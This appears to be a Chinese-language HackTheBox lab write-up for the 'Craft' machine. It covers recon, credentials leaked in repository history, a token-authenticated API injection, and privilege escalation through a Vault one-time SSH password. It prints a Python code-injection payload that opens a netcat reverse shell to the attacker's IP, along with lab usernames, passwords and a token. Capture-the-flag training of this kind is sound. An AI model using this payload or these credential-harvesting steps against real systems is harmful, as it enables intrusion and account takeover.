# Craft

## 环境

平台：HackTheBox

攻击机：Kali（IP：10.10.14.16）

靶机：Craft（IP：10.10.10.110）

地址：https://www.hackthebox.eu/home/machines/profile/197

## Let's go

```
nmap -A 10.10.10.110
```

![](./img/Craft-01.png)

> **审查发现两个地址，添加hosts**

![](./img/Craft-02.png)

![](./img/Craft-03.png)

> **接下来，慢慢进行探索**

![](./img/Craft-04.png)

![](./img/Craft-05.png)

> **发现  /api/brew/  接口的abv值可能存在问题，并且这个接口需要认证，我们进行进一步检查**

![](./img/Craft-06.png)

![](./img/Craft-07.png)

>**果然发现问题，接下来我们需要想办法通过认证**

![](./img/Craft-08.png)

> **在 test.py 的历史记录中找到用户名 'dinesh' 和密码 '4aUh0A8PbVJxgd'**

![](./img/Craft-09.png)

>**通过得到的用户名和密码获取token**

![](./img/Craft-10.png)

```
X-Craft-API-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTc3NjI0NDUwfQ.s3CYce6bX6z2YUjPYBMqCVnt0qzUldXooH7PGAuPWNA
"abv": "__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 4343 >/tmp/f"
```

![](./img/Craft-11.png)

> **发现在 docker 中并且找到 dbtest.py，我们可以修改 dbtest.py 中的sql语句查询数据库**

![](./img/Craft-12.png)

```
SELECT * FROM user
```

> **查询到 user 表中的所有用户名和密码**

![](./img/Craft-13.png)

> **尝试登录仓库，发现 gilfoyle 拥有私人仓库，并且发现SSH密钥**

![](./img/Craft-14.png)

> **尝试密钥登陆发现警告提示，说id_rsa权限太高**

![](./img/Craft-15.png)

```
chmod 600 id_rsa
ssh gilfoyle@10.10.10.110 -i id_rsa
password:ZEU3N8WNM2rh4T
```

![](./img/Craft-16.png)

> **尝试提权无果，回到仓库注意到 vault ，搜索发现他是用来生成一次性钥匙的**
>
> https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html

```
vault write ssh/creds/root_otp ip=10.10.10.110
```

![](./img/Craft-17.png)

```
ssh root@10.10.10.110
```

![](./img/Craft-18.png)